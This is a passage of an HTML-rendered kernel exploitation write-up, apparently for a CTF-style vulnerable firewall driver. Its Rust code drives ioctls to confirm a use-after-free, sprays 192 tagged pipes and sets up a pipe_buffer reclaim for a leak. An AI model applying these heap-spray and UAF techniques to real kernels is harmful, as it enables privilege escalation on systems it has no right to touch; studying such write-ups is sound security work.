+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span><span style="color:#bbb">        </span><span style="color:#007020">Ok</span>(idx)<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#bbb">    </span>}<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#bbb"></span>}<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span><span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span><span style="color:#bbb"></span><span style="color:#007020;font-weight:bold">fn</span> <span style="color:#06287e">fw_del</span>(fd: <span style="color:#0e84b5;font-weight:bold">c_int</span>,<span style="color:#bbb"> </span>idx: <span style="color:#902000">i32</span>)<span style="color:#bbb"> </span>-&gt; <span style="color:#0e84b5;font-weight:bold">io</span>::<span style="color:#007020">Result</span><span style="color:#666">&lt;</span>()<span style="color:#666">&gt;</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">let</span><span style="color:#bbb"> </span>ret<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb"> </span>ioctl(fd,<span style="color:#bbb"> </span>IoctlCMD::<span style="color:#60add5">FW_DEL_RULE</span><span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">as</span><span style="color:#bbb"> </span>c_ulong,<span style="color:#bbb"> </span>idx<span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">as</span><span style="color:#bbb"> </span>c_ulong)<span style="color:#bbb"> </span>};<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">if</span><span style="color:#bbb"> </span>ret<span style="color:#bbb"> </span><span style="color:#666">&lt;</span><span style="color:#bbb"> </span><span style="color:#40a070">0</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span><span style="color:#bbb">        </span><span style="color:#007020">Err</span>(io::Error::last_os_error())<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span><span style="color:#bbb">    </span>}<span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">else</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span><span style="color:#bbb">        </span><span style="color:#007020">Ok</span>(())<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span><span style="color:#bbb">    </span>}<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span><span style="color:#bbb"></span>}<span style="color:#bbb">
+</span></span></span></code></pre></div><p>Let&rsquo;s confirm the UAF by calling <code>fw_show</code> on <code>idxs[0]</code>.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#007020;font-weight:bold">fn</span> <span style="color:#06287e">fw_show</span>(fd: <span style="color:#0e84b5;font-weight:bold">c_int</span>,<span style="color:#bbb"> </span>idx: <span style="color:#902000">i32</span>,<span style="color:#bbb"> </span>off: <span style="color:#902000">u64</span>,<span style="color:#bbb"> </span>out: <span style="color:#007020">&amp;</span><span style="color:#0e84b5;font-weight:bold">mut</span><span style="color:#bbb"> </span>[<span style="color:#902000">u8</span>])<span style="color:#bbb"> </span>-&gt; <span style="color:#0e84b5;font-weight:bold">io</span>::<span style="color:#007020">Result</span><span style="color:#666">&lt;</span>()<span style="color:#666">&gt;</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">if</span><span style="color:#bbb"> </span>out.len()<span style="color:#bbb"> </span><span style="color:#666">&gt;</span><span style="color:#bbb"> </span><span style="color:#40a070">0x400</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#bbb">        </span><span style="color:#007020;font-weight:bold">return</span><span style="color:#bbb"> </span><span style="color:#007020">Err</span>(io::Error::new(<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#bbb">            </span>io::ErrorKind::InvalidInput,<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#bbb">            </span><span style="color:#4070a0">&#34;FW_SHOW_RULE output buffer too large&#34;</span>,<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#bbb">        </span>));<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#bbb">    </span>}<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">let</span><span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">mut</span><span style="color:#bbb"> </span>req<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span>FwReq<span style="color:#bbb"> </span>{<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#bbb">        </span>idx,<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span><span style="color:#bbb">        </span>pad: <span style="color:#40a070">0</span>,<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#bbb">        </span>off,<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#bbb">        </span>size: <span style="color:#0e84b5;font-weight:bold">out</span>.len()<span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">as</span><span style="color:#bbb"> </span><span style="color:#902000">u64</span>,<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span><span style="color:#bbb">        </span>data: [<span style="color:#40a070">0</span>;<span style="color:#bbb"> </span><span style="color:#40a070">0x400</span>],<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span><span style="color:#bbb">    </span>};<span style="color:#bbb"> 
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span><span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">let</span><span style="color:#bbb"> </span>ret<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb"> </span>ioctl(fd,<span style="color:#bbb"> </span>IoctlCMD::<span style="color:#60add5">FW_SHOW_RULE</span><span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">as</span><span style="color:#bbb"> </span>c_ulong,<span style="color:#bbb"> </span><span style="color:#666">&amp;</span><span style="color:#007020;font-weight:bold">mut</span><span style="color:#bbb"> </span>req)<span style="color:#bbb"> </span>};<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">if</span><span style="color:#bbb"> </span>ret<span style="color:#bbb"> </span><span style="color:#666">&lt;</span><span style="color:#bbb"> </span><span style="color:#40a070">0</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span><span style="color:#bbb">        </span><span style="color:#007020">Err</span>(io::Error::last_os_error())<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span><span style="color:#bbb">    </span>}<span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">else</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span><span style="color:#bbb">        </span>out.copy_from_slice(<span style="color:#666">&amp;</span>req.data[<span style="color:#666">..</span>out.len()]);<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span><span style="color:#bbb">        </span><span style="color:#007020">Ok</span>(())<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span><span style="color:#bbb">    </span>}<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span><span style="color:#bbb"></span>}<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span><span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span><span style="color:#bbb"></span>fw_show(fd,<span style="color:#bbb"> </span>idxs[<span style="color:#40a070">0</span>],<span style="color:#bbb"> </span><span style="color:#40a070">0</span>,<span style="color:#bbb"> </span><span style="color:#666">&amp;</span><span style="color:#007020;font-weight:bold">mut</span><span style="color:#bbb"> </span>leak).expect(<span style="color:#4070a0">&#34;FW_SHOW_RULE failed&#34;</span>);<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span><span style="color:#bbb"></span><span style="color:#06287e">println!</span>(<span style="color:#4070a0">&#34;[leak idx</span><span style="color:#70a0d0">{}</span><span style="color:#4070a0">]: </span><span style="color:#70a0d0">{:02x?}</span><span style="color:#4070a0">&#34;</span>,<span style="color:#bbb"> </span>idxs[<span style="color:#40a070">0</span>],<span style="color:#bbb"> </span><span style="color:#666">&amp;</span>leak[<span style="color:#666">..</span><span style="color:#40a070">32</span>]);<span style="color:#bbb">
+</span></span></span></code></pre></div><p>If the output still contains the rule string after deletion, the UAF is confirmed.</p>
+<h1 id="spray">Spray</h1>
+<p>Let&rsquo;s create 192 pipes and check the leak again.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#007020;font-weight:bold">fn</span> <span style="color:#06287e">pipe_create</span>()<span style="color:#bbb"> </span>-&gt; <span style="color:#0e84b5;font-weight:bold">io</span>::<span style="color:#007020">Result</span><span style="color:#666">&lt;</span>[c_int;<span style="color:#bbb"> </span><span style="color:#40a070">2</span>]<span style="color:#666">&gt;</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">let</span><span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">mut</span><span style="color:#bbb"> </span>fds<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span>[<span style="color:#666">-</span><span style="color:#40a070">1</span>;<span style="color:#bbb"> </span><span style="color:#40a070">2</span>];<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">let</span><span style="color:#bbb"> </span>ret<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb"> </span>pipe(fds.as_mut_ptr())<span style="color:#bbb"> </span>};<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">if</span><span style="color:#bbb"> </span>ret<span style="color:#bbb"> </span><span style="color:#666">&lt;</span><span style="color:#bbb"> </span><span style="color:#40a070">0</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#bbb">        </span><span style="color:#007020">Err</span>(io::Error::last_os_error())<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span><span style="color:#bbb">    </span>}<span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">else</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span><span style="color:#bbb">        </span><span style="color:#007020">Ok</span>(fds)<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span><span style="color:#bbb">    </span>}<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9</span><span><span style="color:#bbb"></span>}<span style="color:#bbb">
+</span></span></span></code></pre></div><p>If you run:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">let</span><span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">mut</span><span style="color:#bbb"> </span>pipes<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span><span style="color:#007020">Vec</span>::new();<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">for</span><span style="color:#bbb"> </span>i<span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">in</span><span style="color:#bbb"> </span><span style="color:#40a070">0</span><span style="color:#666">..</span><span style="color:#40a070">192</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#bbb">        </span><span style="color:#007020;font-weight:bold">let</span><span style="color:#bbb"> </span>pipefd<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span>pipe_create().expect(<span style="color:#4070a0">&#34;pipe failed!&#34;</span>);<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#bbb">        </span><span style="color:#06287e">println!</span>(<span style="color:#4070a0">&#34;[pipe </span><span style="color:#70a0d0">{i}</span><span style="color:#4070a0">]: r=</span><span style="color:#70a0d0">{}</span><span style="color:#4070a0">, w=</span><span style="color:#70a0d0">{}</span><span style="color:#4070a0">&#34;</span>,<span style="color:#bbb"> </span>pipefd[<span style="color:#40a070">0</span>],<span style="color:#bbb"> </span>pipefd[<span style="color:#40a070">1</span>]);<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#bbb">        </span>pipes.push(pipefd);<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#bbb">    </span>}<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">let</span><span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">mut</span><span style="color:#bbb"> </span>leak<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span>[<span style="color:#40a070">0</span>;<span style="color:#bbb"> </span><span style="color:#40a070">0x400</span>];<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#bbb">    </span>fw_show(fd,<span style="color:#bbb"> </span>idxs[<span style="color:#40a070">0</span>],<span style="color:#bbb"> </span><span style="color:#40a070">0</span>,<span style="color:#bbb"> </span><span style="color:#666">&amp;</span><span style="color:#007020;font-weight:bold">mut</span><span style="color:#bbb"> </span>leak).expect(<span style="color:#4070a0">&#34;FW_SHOW_RULE failed&#34;</span>);<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#bbb">    </span><span style="color:#06287e">println!</span>(<span style="color:#4070a0">&#34;[leak idx[</span><span style="color:#70a0d0">{}</span><span style="color:#4070a0">]]: </span><span style="color:#70a0d0">{:02x?}</span><span style="color:#4070a0">&#34;</span>,<span style="color:#bbb"> </span>idxs[<span style="color:#40a070">0</span>],<span style="color:#bbb"> </span><span style="color:#666">&amp;</span>leak[<span style="color:#666">..</span><span style="color:#40a070">32</span>]);<span style="color:#bbb">
+</span></span></span></code></pre></div><p>At this point, you will see zeros. The reason is that a pipe does not get a useful <code>pipe_buffer</code> entry until data is written into it.</p>
+<p>So the spray must also write a small tag into each pipe:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#007020;font-weight:bold">let</span><span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">mut</span><span style="color:#bbb"> </span>pipes<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span><span style="color:#007020">Vec</span>::new();<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#bbb"></span><span style="color:#007020;font-weight:bold">for</span><span style="color:#bbb"> </span>i<span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">in</span><span style="color:#bbb"> </span><span style="color:#40a070">0</span><span style="color:#666">..</span><span style="color:#40a070">192</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">let</span><span style="color:#bbb"> </span>pipefd<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span>pipe_create().expect(<span style="color:#4070a0">&#34;pipe failed!&#34;</span>);<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">let</span><span style="color:#bbb"> </span>tag<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span><span style="color:#06287e">vec!</span>[<span style="color:#4070a0">b</span><span style="color:#4070a0">&#39;A&#39;</span><span style="color:#bbb"> </span><span style="color:#666">+</span><span style="color:#bbb"> </span>(i<span style="color:#bbb"> </span><span style="color:#666">%</span><span style="color:#bbb"> </span><span style="color:#40a070">26</span>)<span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">as</span><span style="color:#bbb"> </span><span style="color:#902000">u8</span>;<span style="color:#bbb"> </span>i<span style="color:#bbb"> </span><span style="color:#666">+</span><span style="color:#bbb"> </span><span style="color:#40a070">1</span>];<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#bbb">    </span>pipe_write(pipefd[<span style="color:#40a070">1</span>],<span style="color:#bbb"> </span><span style="color:#666">&amp;</span>tag).expect(<span style="color:#4070a0">&#34;pipe write failed&#34;</span>);<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#bbb">    </span><span style="color:#06287e">println!</span>(<span style="color:#4070a0">&#34;[pipe </span><span style="color:#70a0d0">{i}</span><span style="color:#4070a0">]: r=</span><span style="color:#70a0d0">{}</span><span style="color:#4070a0">, w=</span><span style="color:#70a0d0">{}</span><span style="color:#4070a0">, len=</span><span style="color:#70a0d0">{}</span><span style="color:#4070a0">&#34;</span>,<span style="color:#bbb"> </span>pipefd[<span style="color:#40a070">0</span>],<span style="color:#bbb"> </span>pipefd[<span style="color:#40a070">1</span>],<span style="color:#bbb"> </span>tag.len());<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#bbb">    </span>pipes.push(pipefd);<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#bbb"></span>}<span style="color:#bbb">
+</span></span></span></code></pre></div><p>The length is intentional: <code>pipe_buffer.len == i + 1</code>, so once we leak a reclaimed <code>pipe_buffer</code>, we can recover the matching pipe as <code>hit_pipe = len - 1</code>.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#007020;font-weight:bold">struct</span> pipe_buffer {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>	<span style="color:#007020;font-weight:bold">struct</span> page <span style="color:#666">*</span>page;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>	<span style="color:#902000">unsigned</span> <span style="color:#902000">int</span> offset, len;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>	<span style="color:#007020;font-weight:bold">const</span> <span style="color:#007020;font-weight:bold">struct</span> pipe_buf_operations <span style="color:#666">*</span>ops;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>	<span style="color:#902000">unsigned</span> <span style="color:#902000">int</span> flags;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>	<span style="color:#902000">unsigned</span> <span style="color:#902000">long</span> private;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>};
